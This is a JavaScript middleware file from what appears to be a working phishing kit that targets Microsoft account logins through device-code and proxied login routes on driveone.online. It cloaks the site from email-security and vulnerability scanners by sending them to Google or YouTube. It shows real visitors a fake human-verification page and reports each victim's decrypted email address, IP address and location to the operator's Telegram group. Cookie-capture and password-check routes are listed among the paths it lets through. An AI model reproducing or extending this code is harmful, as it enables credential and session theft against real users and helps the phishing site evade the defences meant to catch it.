// middleware/botDetection.js
const { getFingerprint, decrypt } = require('../utils/encryption');
const { getVictimInfo } = require('../utils/helpers');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');

// File paths for persistent storage
const DATA_DIR = './data';
const BLOCKED_IPS_FILE = path.join(DATA_DIR, 'blocked_ips.txt');
const VISITOR_LOG_FILE = path.join(DATA_DIR, 'visitor_log.json');
const BOT_DETECTIONS_LOG = path.join(DATA_DIR, 'bot_detections.log');
const TOKENS_FILE = path.join(DATA_DIR, 'verification_tokens.json');
const CAPTURED_DATA_DIR = path.join(DATA_DIR, 'captured_data');

// Token storage
let tokenStore = new Map();

// IP Intelligence Cache
const ipIntelCache = new Map();

// Token configuration
const TOKEN_CONFIG = {
    TOKEN_EXPIRY_MS: 24 * 60 * 60 * 1000,
    MIN_MOUSE_MOVEMENTS: 10,
    MAX_VERIFICATION_TIME_MS: 60000,
    MIN_VERIFICATION_TIME_MS: 300
};

// Allowed countries (for logging only)
const ALLOWED_COUNTRIES = ['US', 'CA', 'AU', 'GB', 'DE', 'FR'];

// Bot signatures for detection
const BOT_SIGNATURES = {
    'googlebot': { type: 'Google Search Bot', category: 'search_engine' },
    'bingbot': { type: 'Bing Search Bot', category: 'search_engine' },
    'facebookexternalhit': { type: 'Facebook Bot', category: 'social_media' },
    'twitterbot': { type: 'Twitter Bot', category: 'social_media' },
    'linkedinbot': { type: 'LinkedIn Bot', category: 'social_media' },
    'slackbot': { type: 'Slack Bot', category: 'social_media' },
    'discordbot': { type: 'Discord Bot', category: 'social_media' },
    'whatsapp': { type: 'WhatsApp Bot', category: 'social_media' },
    'telegrambot': { type: 'Telegram Bot', category: 'social_media' },
    'proofpoint': { type: 'Proofpoint Email Security', category: 'email_security' },
    'mimecast': { type: 'Mimecast Email Security', category: 'email_security' },
    'barracuda': { type: 'Barracuda Email Security', category: 'email_security' },
    'microsoft.atp': { type: 'Microsoft Defender ATP', category: 'email_security' },
    'microsoft-defender': { type: 'Microsoft Defender', category: 'email_security' },
    'safelinks': { type: 'Microsoft Safe Links', category: 'email_security' },
    'exchange online': { type: 'Exchange Online Protection', category: 'email_security' },
    'google.postmaster': { type: 'Google Postmaster', category: 'email_security' },
    'trend.micro': { type: 'Trend Micro', category: 'email_security' },
    'sophos': { type: 'Sophos Security', category: 'email_security' },
    'fortinet': { type: 'Fortinet Security', category: 'email_security' },
    'cisco.esa': { type: 'Cisco ESA', category: 'email_security' },
    'mcafee': { type: 'McAfee Security', category: 'email_security' },
    'symantec': { type: 'Symantec Security', category: 'email_security' },
    'kaspersky': { type: 'Kaspersky Security', category: 'email_security' },
    'cloudflare': { type: 'Cloudflare', category: 'cdn' },
    'amazonaws': { type: 'AWS Scanner', category: 'hosting' },
    'azure': { type: 'Azure Scanner', category: 'hosting' },
    'googlecloud': { type: 'Google Cloud Scanner', category: 'hosting' },
    'python-requests': { type: 'Python Script', category: 'script' },
    'curl': { type: 'cURL Script', category: 'script' },
    'wget': { type: 'Wget Script', category: 'script' },
    'go-http-client': { type: 'Go HTTP Client', category: 'script' },
    'axios': { type: 'Axios HTTP Client', category: 'script' },
    'node-fetch': { type: 'Node Fetch', category: 'script' },
    'headless': { type: 'Headless Browser', category: 'automation' },
    'puppeteer': { type: 'Puppeteer Automation', category: 'automation' },
    'selenium': { type: 'Selenium Automation', category: 'automation' },
    'phantomjs': { type: 'PhantomJS', category: 'automation' },
    'scrapy': { type: 'Scrapy Spider', category: 'scraper' },
    'nmap': { type: 'Nmap Scanner', category: 'vulnerability' },
    'nikto': { type: 'Nikto Scanner', category: 'vulnerability' },
    'sqlmap': { type: 'SQLMap Scanner', category: 'vulnerability' },
    'burp': { type: 'Burp Suite', category: 'vulnerability' },
    'zap': { type: 'OWASP ZAP', category: 'vulnerability' }
};

// Store visitor logs
let visitorLogs = [];

// ============ LOAD/SAVE FUNCTIONS ============
function loadBlockedIPs() {
    try {
        if (fs.existsSync(BLOCKED_IPS_FILE)) {
            const content = fs.readFileSync(BLOCKED_IPS_FILE, 'utf8');
            const ips = content.split('\n').filter(ip => ip.trim().length > 0);
            ips.forEach(ip => blockedIPs.add(ip));
            console.log(`📋 Loaded ${blockedIPs.size} blocked IPs`);
        }
    } catch(e) {
        console.error('Failed to load blocked IPs:', e.message);
    }
}

function saveBlockedIPs() {
    try {
        const ips = Array.from(blockedIPs).join('\n');
        fs.writeFileSync(BLOCKED_IPS_FILE, ips);
    } catch(e) {
        console.error('Failed to save blocked IPs:', e.message);
    }
}

// Helper function to get email from device session file
function getEmailFromDeviceSession(sessionId) {
    try {
        // Try main sessions file first (device_sessions.json)
        const sessionsFile = path.join(DATA_DIR, 'device_sessions.json');
        if (fs.existsSync(sessionsFile)) {
            const data = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
            if (data[sessionId] && data[sessionId].email) {
                console.log(`📧 Found email in device_sessions.json for ${sessionId}: ${data[sessionId].email}`);
                return data[sessionId].email;
            }
        }
        
        // Fallback: individual session file in captured_data
        const safeFileName = sessionId.replace(/[^a-zA-Z0-9]/g, '_');
        const individualFile = path.join(CAPTURED_DATA_DIR, `session_${safeFileName}.json`);
        if (fs.existsSync(individualFile)) {
            const data = JSON.parse(fs.readFileSync(individualFile, 'utf8'));
            if (data && data.email) {
                console.log(`📧 Found email in individual session file for ${sessionId}: ${data.email}`);
                return data.email;
            }
        }
    } catch (e) {
        console.log(`⚠️ Error reading session file for ${sessionId}:`, e.message);
    }
    return null;
}

function loadTokens() {
    try {
        if (fs.existsSync(TOKENS_FILE)) {
            const data = fs.readFileSync(TOKENS_FILE, 'utf8');
            const parsed = JSON.parse(data);
            tokenStore = new Map(parsed);
            
            for (const [token, value] of tokenStore.entries()) {
                if (value.expiresAt && typeof value.expiresAt === 'string') {
                    value.expiresAt = parseInt(value.expiresAt);
                }
                if (value.created && typeof value.created === 'string') {
                    value.created = parseInt(value.created);
                }
            }
            
            console.log(`📂 Loaded ${tokenStore.size} verification tokens`);
            
            const now = Date.now();
            let expiredCount = 0;
            for (const [token, data] of tokenStore.entries()) {
                if (now > data.expiresAt) {
                    tokenStore.delete(token);
                    expiredCount++;
                }
            }
            if (expiredCount > 0) {
                console.log(`🗑️ Removed ${expiredCount} expired tokens`);
                saveTokens();
            }
        }
    } catch (err) {
        console.error('Error loading tokens:', err);
    }
}

function saveTokens() {
    try {
        const data = JSON.stringify(Array.from(tokenStore.entries()));
        fs.writeFileSync(TOKENS_FILE, data, 'utf8');
    } catch (err) {
        console.error('Error saving tokens:', err);
    }
}

setInterval(() => saveTokens(), 60000);
setInterval(() => {
    const now = Date.now();
    let deleted = 0;
    for (const [token, data] of tokenStore.entries()) {
        if (now > data.expiresAt) {
            tokenStore.delete(token);
            deleted++;
        }
    }
    if (deleted > 0) {
        console.log(`🗑️ Cleaned up ${deleted} expired tokens`);
        saveTokens();
    }
}, 60 * 60 * 1000);

// ============ IP INTELLIGENCE ============
async function getIPInfo(ip) {
    if (ipIntelCache.has(ip)) {
        return ipIntelCache.get(ip);
    }
    
    if (ip === '127.0.0.1' || ip === '::1' || ip === 'localhost' || 
        ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
        const localInfo = { 
            userType: 'local', 
            isp: 'Local', 
            org: 'Local',
            countryCode: 'Local',
            city: 'Local',
            region: 'Local',
            isMobile: false, 
            isProxy: false, 
            isHosting: false 
        };
        ipIntelCache.set(ip, localInfo);
        return localInfo;
    }
    
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,city,isp,org,as,asname,mobile,proxy,hosting`, {
            timeout: 3000
        });
        
        if (response.data.status === 'success') {
            const data = response.data;
            
            const info = {
                userType: (data.mobile === true) ? 'mobile' : (data.proxy === true || data.hosting === true) ? 'hosting' : 'residential',
                country: data.country || 'Unknown',
                countryCode: data.countryCode || 'Unknown',
                region: data.region || 'Unknown',
                city: data.city || 'Unknown',
                isp: data.isp || 'Unknown',
                org: data.org || 'Unknown',
                asn: data.as || 'Unknown',
                asname: data.asname || 'Unknown',
                isMobile: data.mobile === true,
                isProxy: data.proxy === true,
                isHosting: data.hosting === true
            };
            
            ipIntelCache.set(ip, info);
            setTimeout(() => ipIntelCache.delete(ip), 24 * 60 * 60 * 1000);
            return info;
        }
    } catch (error) {
        console.log(`⚠️ IP intelligence failed for ${ip}: ${error.message}`);
    }
    
    return { 
        userType: 'unknown', 
        country: 'Unknown',
        countryCode: 'Unknown',
        region: 'Unknown',
        city: 'Unknown',
        isp: 'Unknown', 
        org: 'Unknown',
        isMobile: false, 
        isProxy: false, 
        isHosting: false 
    };
}

// ============ BOT DETECTION ============
function detectBotType(userAgent, ipInfo) {
    const uaLower = userAgent.toLowerCase();
    
    // Check for known bot signatures
    for (const [signature, botInfo] of Object.entries(BOT_SIGNATURES)) {
        if (uaLower.includes(signature)) {
            return botInfo;
        }
    }
    
    // Check for security scanners based on IP type
    if (ipInfo.isProxy || ipInfo.isHosting) {
        return { type: 'Security Scanner / Proxy', category: 'scanner' };
    }
    
    // Check for headless browsers
    if (uaLower.includes('headless') || uaLower.includes('puppeteer') || uaLower.includes('selenium')) {
        return { type: 'Headless Browser Bot', category: 'automation' };
    }
    
    // Check for vulnerability scanners
    const scannerPatterns = ['nmap', 'nikto', 'sqlmap', 'burp', 'zap', 'acunetix', 'nessus'];
    for (const pattern of scannerPatterns) {
        if (uaLower.includes(pattern)) {
            return { type: 'Vulnerability Scanner', category: 'vulnerability' };
        }
    }
    
    // Default: real user
    return { type: 'Real User (Browser)', category: 'human' };
}

// ============ TELEGRAM NOTIFICATION ============
async function sendVisitorNotification(bot, telegramGroupId, visitorInfo) {
    console.log(`🔍 [NOTIFICATION] Starting sendVisitorNotification`);
    console.log(`🔍 [NOTIFICATION] Bot exists: ${!!bot}`);
    console.log(`🔍 [NOTIFICATION] GroupId exists: ${!!telegramGroupId}`);
    console.log(`🔍 [NOTIFICATION] GroupId value: ${telegramGroupId}`);
    
    if (!bot) {
        console.log(`❌ [NOTIFICATION] No bot instance - cannot send notification`);
        return false;
    }
    if (!telegramGroupId) {
        console.log(`❌ [NOTIFICATION] No telegramGroupId - cannot send notification`);
        return false;
    }
    
    console.log(`✅ [NOTIFICATION] Bot and GroupId are valid, building message...`);
    
    // Determine emoji based on visitor type
    let emoji = '👤';
    let statusText = '🔵 VISITOR ARRIVED';
    
    if (visitorInfo.botCategory === 'search_engine') {
        emoji = '🔍';
        statusText = '🔍 SEARCH ENGINE BOT';
    } else if (visitorInfo.botCategory === 'email_security') {
        emoji = '📧';
        statusText = '📧 EMAIL SECURITY SCANNER';
    } else if (visitorInfo.botCategory === 'social_media') {
        emoji = '📱';
        statusText = '📱 SOCIAL MEDIA BOT';
    } else if (visitorInfo.botCategory === 'scanner' || visitorInfo.botCategory === 'vulnerability') {
        emoji = '⚠️';
        statusText = '⚠️ SECURITY SCANNER';
    } else if (visitorInfo.botCategory === 'script' || visitorInfo.botCategory === 'automation') {
        emoji = '🤖';
        statusText = '🤖 AUTOMATION SCRIPT';
    } else if (visitorInfo.botCategory === 'hosting') {
        emoji = '☁️';
        statusText = '☁️ HOSTING/VPS SCANNER';
    } else if (visitorInfo.botCategory === 'cdn') {
        emoji = '🌐';
        statusText = '🌐 CDN BOT';
    } else if (visitorInfo.userType === 'mobile') {
        emoji = '📱';
        statusText = '📱 MOBILE USER';
    } else if (visitorInfo.userType === 'residential') {
        emoji = '🏠';
        statusText = '🏠 RESIDENTIAL USER';
    }
    
 const message = 
    `${emoji} *${statusText}*\n` +
    `╔═══════════╗\n` +
    `║ 🌐 IP: \`${visitorInfo.ip}\`\n` +
    `║ 🤖 Type: ${visitorInfo.botType}\n` +
    `║ 📊 Category: ${visitorInfo.botCategory || visitorInfo.userType}\n` +
    `╠══════════╣\n` +
    `║ 🏳️ Country: ${visitorInfo.country} (${visitorInfo.countryCode})\n` +
    `║ 🗺️ Region: ${visitorInfo.region}\n` +
    `║ 🏙️ City: ${visitorInfo.city}\n` +
    `║ 📡 ISP: ${visitorInfo.isp}\n` +
    `╠═══════════╣\n` +
    `║ 📧 EMAIL:\`${visitorInfo.email}\n` +
    `╠═══════════╣\n` +
    `║ 🔗 Path: ${visitorInfo.path}\n` +
    `║ 🏷️ Subdomain: ${visitorInfo.subdomain || 'None'}\n` +
    `╠═══════════╣\n` +
    `║ 💻 USER AGENT:\`${visitorInfo.userAgent.substring(0, 100)}${visitorInfo.userAgent.length > 100 ? '...' : ''}\`\n` +
    `╚═══════════╝\n` +
    `⏱️ *${new Date().toLocaleString()}*`;
    
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔴 BLOCK IP', callback_data: `block_ip|${visitorInfo.ip}` }],
                [{ text: '📋 VIEW LOGS', callback_data: `view_logs` }]
            ]
        }
    };
    
    try {
        console.log(`📨 [NOTIFICATION] Sending message to Telegram...`);
        const result = await bot.sendMessage(telegramGroupId, message);
        console.log(`✅ [NOTIFICATION] Visitor notification sent for IP: ${visitorInfo.ip}`);
        console.log(`✅ [NOTIFICATION] Message ID: ${result.message_id}`);
        return true;
    } catch (e) {
        console.error(`❌ [NOTIFICATION] Telegram error: ${e.message}`);
        console.error(`❌ [NOTIFICATION] Full error:`, e);
        return false;
    }
}

// ============ VALIDATE SUBDOMAIN AND EMAIL ============
function isValidSubdomain(hostname, expectedDomain = 'driveone.online') {
    // Check for localhost (development)
    if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1') {
        return true;
    }
    
    // Check if it's a valid subdomain of our domain
    if (!hostname || !hostname.endsWith(expectedDomain)) return false;
    
    const subdomainPart = hostname.replace(`.${expectedDomain}`, '');
    // Subdomain should be 8 characters (hash)
    return subdomainPart.length > 0 && /^[a-f0-9]{8}$/.test(subdomainPart);
}

function isValidEncryptedEmail(encryptedEmail) {
    if (!encryptedEmail) return false;
    // Encrypted email should be base64-like string (no spaces, reasonable length)
    return encryptedEmail.length > 10 && encryptedEmail.length < 200 && /^[A-Za-z0-9\-_]+$/.test(encryptedEmail);
}

// ============ REDIRECT INVALID REQUESTS ============
function redirectInvalidRequest(res, target = 'google') {
    const urls = {
        google: 'https://www.google.com',
        youtube: 'https://www.youtube.com',
        bing: 'https://www.bing.com',
        duckduckgo: 'https://duckduckgo.com'
    };
    
    // Randomly choose between Google and YouTube
    const randomTarget = Math.random() < 0.5 ? urls.google : urls.youtube;
    console.log(`🔄 Redirecting invalid request to: ${randomTarget}`);
    res.redirect(randomTarget);
}

// ============ MOUSE VERIFICATION PAGE ============
function showVerificationPage(res, encryptedEmail, returnUrl, verifiedSessions, fingerprint, visitorInfo) {
    const requiredMoves = TOKEN_CONFIG.MIN_MOUSE_MOVEMENTS;
    const emailParam = encryptedEmail ? `'${encryptedEmail}'` : 'null';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Verify you're human</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                *{box-sizing:border-box}
                body{font-family:system-ui;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
                .card{background:white;border-radius:20px;padding:40px;max-width:450px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
                h2{margin-top:0;color:#333}
                .mouse-area{background:#f8f9fa;border:2px dashed #dee2e6;border-radius:12px;padding:30px;margin:20px 0;cursor:crosshair;transition:all .3s}
                .mouse-area.active{border-color:#667eea;background:#f0f2ff}
                button{background:#667eea;color:white;border:none;padding:14px 28px;font-size:16px;border-radius:10px;cursor:pointer;font-weight:600;transition:all .2s}
                button:hover{background:#5a67d8;transform:scale(1.02)}
                button:disabled{opacity:0.5;cursor:not-allowed;transform:none}
                .status{margin-top:20px;padding:12px;border-radius:8px;font-size:14px;display:none}
                .status.success{background:#d4edda;color:#155724;display:block}
                .status.error{background:#f8d7da;color:#721c24;display:block}
                .status.info{background:#d1ecf1;color:#0c5460;display:block}
                .info-text{font-size:12px;color:#6c757d;margin-top:15px}
                .spinner{display:inline-block;width:20px;height:20px;border:2px solid #f3f3f3;border-top:2px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-right:8px;vertical-align:middle}
                @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
            </style>
        </head>
        <body>
            <div class="card">
                <h2>🔒 Security Check</h2>
                <p>Please complete verification to continue:</p>
                <div id="mouseArea" class="mouse-area">🖱️ Move your mouse anywhere in this box</div>
                <button id="verifyBtn" disabled style="margin-top: 10px;">✓ Verify Humanity</button>
                <div id="status" class="status"></div>
                <div class="info-text">Move your mouse ${requiredMoves} times to verify</div>
            </div>
            <script>
                let mouseMoves = 0;
                let verified = false;
                let verificationInProgress = false;
                const startTime = Date.now();
                const REQUIRED_MOVES = ${requiredMoves};
                const ENCRYPTED_EMAIL = ${emailParam};
                const RETURN_URL = '${returnUrl}';
                const FINGERPRINT = '${fingerprint || ''}';
                
                const mouseDiv = document.getElementById('mouseArea');
                const verifyBtn = document.getElementById('verifyBtn');
                const statusDiv = document.getElementById('status');
                
                const counter = document.createElement('div');
                counter.style.fontSize = '12px';
                counter.style.marginTop = '10px';
                counter.style.color = '#6c757d';
                mouseDiv.parentNode.insertBefore(counter, mouseDiv.nextSibling);
                
                mouseDiv.addEventListener('mousemove', function() {
                    if (verified || verificationInProgress) return;
                    mouseMoves++;
                    mouseDiv.classList.add('active');
                    
                    if (mouseMoves >= REQUIRED_MOVES) {
                        verifyBtn.disabled = false;
                        counter.innerHTML = '✓ Ready to verify';
                        counter.style.color = '#28a745';
                    } else {
                        counter.innerHTML = '🖱️ Movements: ' + mouseMoves + '/' + REQUIRED_MOVES;
                    }
                });
                
                mouseDiv.addEventListener('mouseleave', function() {
                    mouseDiv.classList.remove('active');
                });
                
                verifyBtn.addEventListener('click', async function() {
                    if (verified || verificationInProgress) return;
                    verificationInProgress = true;
                    verifyBtn.disabled = true;
                    verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
                    statusDiv.className = 'status info';
                    statusDiv.textContent = 'Checking verification data...';
                    
                    const elapsed = Date.now() - startTime;
                    
                    const screenData = {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio || 1
                    };
                    
                    try {
                        const response = await fetch('/verify-human', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                encryptedEmail: ENCRYPTED_EMAIL,
                                mouseMovements: mouseMoves,
                                totalTime: elapsed,
                                userAgent: navigator.userAgent,
                                returnUrl: RETURN_URL,
                                screenData: screenData,
                                fingerprint: FINGERPRINT
                            })
                        });
                        const result = await response.json();
                        
                        if (result.valid) {
                            verified = true;
                            statusDiv.className = 'status success';
                            statusDiv.innerHTML = '✓ Verification successful! Redirecting...';
                            setTimeout(function() { window.location.href = result.returnUrl || RETURN_URL; }, 800);
                        } else {
                            statusDiv.className = 'status error';
                            statusDiv.innerHTML = '✗ Verification failed. Please try again.';
                            verificationInProgress = false;
                            verifyBtn.disabled = false;
                            verifyBtn.innerHTML = '✓ Try Again';
                            counter.innerHTML = '🖱️ Movements: 0/' + REQUIRED_MOVES;
                            mouseMoves = 0;
                        }
                    } catch(err) {
                        statusDiv.className = 'status error';
                        statusDiv.innerHTML = '✗ Error verifying. Please refresh and try again.';
                        verificationInProgress = false;
                        verifyBtn.disabled = false;
                        verifyBtn.innerHTML = '✓ Try Again';
                    }
                });
            </script>
        </body>
        </html>
    `);
}

// ============ VERIFICATION HANDLER ============
async function handleVerification(req, res, verifiedSessions) {
    const { encryptedEmail, mouseMovements, totalTime, userAgent, returnUrl, screenData, fingerprint } = req.body;
    
    const tokenData = tokenStore.get(encryptedEmail);
    
    if (!tokenData || Date.now() > tokenData.expiresAt) {
        if (tokenData) {
            tokenStore.delete(encryptedEmail);
            saveTokens();
        }
        return res.json({ valid: false, returnUrl: null });
    }
    
    const isValid = (
        mouseMovements >= TOKEN_CONFIG.MIN_MOUSE_MOVEMENTS &&
        totalTime >= TOKEN_CONFIG.MIN_VERIFICATION_TIME_MS &&
        totalTime <= TOKEN_CONFIG.MAX_VERIFICATION_TIME_MS &&
        userAgent &&
        !userAgent.includes('Headless') &&
        !userAgent.includes('bot') &&
        !userAgent.includes('python') &&
        !userAgent.includes('curl')
    );
    
    if (isValid) {
        const clientFingerprint = fingerprint || getFingerprint(req);
        verifiedSessions.set(clientFingerprint, {
            timestamp: Date.now(),
            userAgent: userAgent,
            ip: req.ip || req.socket.remoteAddress,
            email: encryptedEmail,
            screenData: screenData
        });
        
        // Set verification cookie (works for both HTTP and HTTPS)
        const isSecure = req.secure || req.protocol === 'https';
        res.cookie('verified_' + encryptedEmail, 'true', {
            maxAge: 1200000, // 1 hour
            // maxAge:0,
            httpOnly: true,
            secure: isSecure,
            sameSite: 'lax',
            path: '/'
        });
        
        console.log(`✅ Verification PASSED: ${encryptedEmail ? encryptedEmail.substring(0, 20) : 'No email'} | Movements: ${mouseMovements} | Time: ${totalTime}ms`);
     
        return res.json({ valid: true, returnUrl: returnUrl });
    } else {
        console.log(`❌ Verification FAILED: ${encryptedEmail ? encryptedEmail.substring(0, 20) : 'No email'} | Movements: ${mouseMovements} | Time: ${totalTime}ms`);
        return res.json({ valid: false, returnUrl: null });
    }
}
// ============ MAIN MIDDLEWARE ============
// ============ MAIN MIDDLEWARE ============
function unifiedBotDetection(verifiedSessions) {
    loadTokens();
    
    return async function(req, res, next) {
        // Whitelisted paths - no verification needed
           const whitelistedPaths = [
            '/api/create-subdomain',
            '/api/subdomain-stats',
            '/api/subdomain-cleanup',
            '/api/block-subdomain',
            '/verify-human',
            '/device-code/auth',
            '/device-code/step2',
            '/api/device-code/verify',
            '/api/device-code/poll',
            '/api/device-code/tokens',
            '/api/device-code/session',
            '/api/outlook-proxy',
            '/api/refresh-token',
            '/proxy/live-oauth',
            '/proxy/live-login',
            '/proxy/live-api',
            '/api/validate-token',
            '/yuing',
            '/en-us/auth',
            '/proxy/dual-login',
              '/live-proxy/oauth20_authorize.srf', 
              '/checkpassword.srf'
            
        ];
        
        // API key bypass
        const apiKey = req.headers['x-api-key'];
        if (apiKey && apiKey === process.env.INTERNAL_API_KEY) {
            return next();
        }
        
        const fingerprint = getFingerprint(req);
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || '';
        const hostname = req.hostname;
        const fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
        
        // Get encrypted email from query params
        const encryptedEmail = req.query.email;
        
        console.log(`\n🔍 [MIDDLEWARE] ========== NEW REQUEST ==========`);
        console.log(`🔍 [MIDDLEWARE] Path: ${req.path}`);
        console.log(`🔍 [MIDDLEWARE] Method: ${req.method}`);
        console.log(`🔍 [MIDDLEWARE] Hostname: ${hostname}`);
        console.log(`🔍 [MIDDLEWARE] IP: ${ip}`);
        console.log(`🔍 [MIDDLEWARE] Encrypted Email: ${encryptedEmail?.substring(0, 30)}...`);
        
        // ============ SKIP NOTIFICATIONS FOR POLLING/ASSET ENDPOINTS ============
        const skipNotificationPaths = [
            '/api/device-code/poll',
            '/api/device-code/verify',
            '/verify-human',
            '/favicon.ico',
            '/robots.txt',
            '/sitemap.xml',
            '/health',
            '/test-telegram',
            '/api/capture-cookies',      // ADD THIS
            '/api/track-page-view',      // ADD THIS
            '/api/track-click',          // ADD THIS
            '/api/track-form',           // ADD THIS
            '/api/track-api-call',
            '/proxy/GetCredentialType',
            '/common/login',
            '/proxy/dual-login',
            '/api/outlook-proxy',
        ];
        
        const isAsset = req.path.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|json|map|woff|woff2|ttf|eot)$/i);
        const isPollingEndpoint = skipNotificationPaths.includes(req.path) || isAsset;
        
        // ============ GET VISITOR INFORMATION (FOR ALL REQUESTS) ============
const ipInfo = await getIPInfo(ip);
const botInfo = detectBotType(userAgent, ipInfo);
const victimInfo = await getVictimInfo(req);

// ============ DECRYPT EMAIL OR GET FROM SESSION ============
// ============ DECRYPT EMAIL OR GET FROM SESSION ============
let finalEmail = 'None';

// At the very beginning of the middleware function
if (req.path.startsWith('/live-proxy')) {
    console.log(`🔓 [MIDDLEWARE] Bypassing proxy path: ${req.path}`);
    return next();
}

// Special handling for /device-code/step2
if (req.path === '/device-code/step2') {
    const sessionId = req.query.sid;
    if (sessionId) {
        try {
            const sessionsFile = path.join(DATA_DIR, 'device_sessions.json');
            if (fs.existsSync(sessionsFile)) {
                const sessionsData = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
                if (sessionsData[sessionId] && sessionsData[sessionId].email) {
                    finalEmail = sessionsData[sessionId].email;
                    console.log(`📧 [STEP2] Found email from sessions file: ${finalEmail}`);
                } else {
                    console.log(`⚠️ [STEP2] Session ${sessionId} not found in file`);
                }
            } else {
                console.log(`⚠️ [STEP2] Sessions file does not exist`);
            }
        } catch (err) {
            console.error(`⚠️ [STEP2] Error reading sessions file: ${err.message}`);
        }
    }
} 
// For /device-code/auth, decrypt the email from URL
else if (encryptedEmail) {
    try {
        finalEmail = decrypt(encryptedEmail);
        console.log(`🔓 Decrypted email from query: ${finalEmail}`);
    } catch (e) {
        console.log(`⚠️ Failed to decrypt email: ${e.message}`);
        finalEmail = encryptedEmail;
    }
}
        
        // Prepare visitor info for notification
        const visitorInfo = {
            ip: ip,
            userType: ipInfo.userType,
            botType: botInfo.type,
            botCategory: botInfo.category,
            country: ipInfo.country === 'Local' ? 'Development' : ipInfo.country,
            countryCode: ipInfo.countryCode === 'Local' ? 'DEV' : ipInfo.countryCode,
            region: ipInfo.region === 'Local' ? 'Development' : ipInfo.region,
            city: ipInfo.city === 'Local' ? 'Localhost' : ipInfo.city,
            isp: ipInfo.isp === 'Local' ? 'Development Environment' : ipInfo.isp,
            hostname: hostname,
            subdomain: hostname === 'localhost' || hostname === '127.0.0.1' ? 'local-dev' : hostname.replace('.driveone.online', ''),
            encryptedEmail: encryptedEmail || 'None',
            email: finalEmail || encryptedEmail || 'None',
            path: req.path,
            userAgent: userAgent,
            location: victimInfo.location || (hostname === 'localhost' ? 'Local Development' : 'Unknown'),
            browser: victimInfo.browser || (hostname === 'localhost' ? 'Local Browser' : 'Unknown'),
            os: victimInfo.os || (hostname === 'localhost' ? 'Local OS' : 'Unknown')
        };
        
        // Log to file (skip for polling to keep logs clean)
        if (!isPollingEndpoint) {
            try {
                const logEntry = `${new Date().toISOString()} | ${visitorInfo.botType} | ${ip} | ${visitorInfo.countryCode} | ${visitorInfo.subdomain} | ${visitorInfo.email.substring(0, 30)} | ${req.path}\n`;
                fs.appendFileSync(BOT_DETECTIONS_LOG, logEntry);
            } catch(e) {
                console.log(`⚠️ Could not write to log: ${e.message}`);
            }
        }
        
        // ============ SEND TELEGRAM NOTIFICATION (SKIP FOR POLLING ENDPOINTS) ============
        const bot = req.app.locals?.bot;
        const groupId = process.env.TELEGRAM_GROUP_ID;
        
        if (isPollingEndpoint) {
            console.log(`🔇 [MIDDLEWARE] Skipping notification for polling/asset endpoint: ${req.path}`);
        } else if (bot && groupId) {
            console.log(`📨 [MIDDLEWARE] Sending notification for ${req.path} from IP: ${ip}`);
            await sendVisitorNotification(bot, groupId, visitorInfo);
        } else {
            console.log(`❌ [MIDDLEWARE] Cannot send notification - Bot: ${!!bot}, GroupId: ${!!groupId}`);
        }
        
        // ============ WHITELIST CHECK - SKIP VERIFICATION ============
        if (whitelistedPaths.includes(req.path)) {
            console.log(`✅ [MIDDLEWARE] Whitelisted path: ${req.path} - Skipping verification, proceeding to route`);
            return next();
        }
        
        // ============ VALIDATE SUBDOMAIN AND EMAIL FOR NON-WHITELISTED ============
        // Allow localhost for development
       const isLocalhost = hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1';

if (isLocalhost) {
    console.log(`🟢 [MIDDLEWARE] Localhost detected - verification still required`);
    // Remove the return next() - let verification continue normally
}
        
        const isValidSub = isValidSubdomain(hostname);
        const isValidEmail = isValidEncryptedEmail(encryptedEmail);
        
        if (!isValidSub) {
            console.log(`🚫 [MIDDLEWARE] INVALID SUBDOMAIN: ${hostname} - Redirecting to Google/YouTube`);
            return redirectInvalidRequest(res);
        }
        
        if (!isValidEmail) {
            console.log(`🚫 [MIDDLEWARE] INVALID EMAIL FORMAT: ${encryptedEmail} - Redirecting to Google/YouTube`);
            return redirectInvalidRequest(res);
        }
        
        // ============ CHECK IF ALREADY VERIFIED ============
        const verifiedSession = verifiedSessions.get(fingerprint);
        const isVerified = verifiedSession && (Date.now() - verifiedSession.timestamp < 3600000);
        
        if (isVerified) {
            console.log(`✅ [MIDDLEWARE] Already verified: ${fingerprint.substring(0, 20)} - ${fullUrl}`);
            return next();
        }
// ============ CHECK IF ALREADY VERIFIED ============
// const verifiedSession = verifiedSessions.get(fingerprint);
// const isVerified = verifiedSession && (Date.now() - verifiedSession.timestamp < 3600000);

if (isVerified) {
    console.log(`✅ [MIDDLEWARE] Already verified: ${fingerprint.substring(0, 20)} - proceeding to route`);
    return next();
}
// =================================================

// ============ SHOW VERIFICATION PAGE ============
console.log(`🖱️ [MIDDLEWARE] Showing mouse verification page to: ${visitorInfo.botType} from ${ip} (${visitorInfo.countryCode})`);
        // Create verification token
        let tokenData = tokenStore.get(encryptedEmail);
        if (!tokenData || Date.now() > tokenData.expiresAt) {
            tokenData = {
                destination: req.query.destination || req.originalUrl,
                created: Date.now(),
                expiresAt: Date.now() + TOKEN_CONFIG.TOKEN_EXPIRY_MS
            };
            tokenStore.set(encryptedEmail, tokenData);
            saveTokens();
        }
        
